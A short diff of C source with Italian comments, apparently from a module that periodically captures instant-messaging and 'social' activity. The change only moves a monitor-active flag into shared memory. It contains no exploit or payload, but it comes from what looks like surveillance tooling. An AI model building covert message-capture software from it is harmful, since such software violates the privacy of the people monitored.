@@ -5,7 +5,8 @@ extern void StartSocialCapture(); // Per far partire le opzioni "social"
 
 #define IM_CAPTURE_INTERVAL 333 // in millisecondi
 
-BOOL bPM_IMStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
+// Dichiarato nella shared per farlo vedere dall'host "social"
+//BOOL bPM_IMStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
 BOOL bPM_imcp = FALSE; // Semaforo per l'uscita del thread
 HANDLE hIMThread = NULL;
 
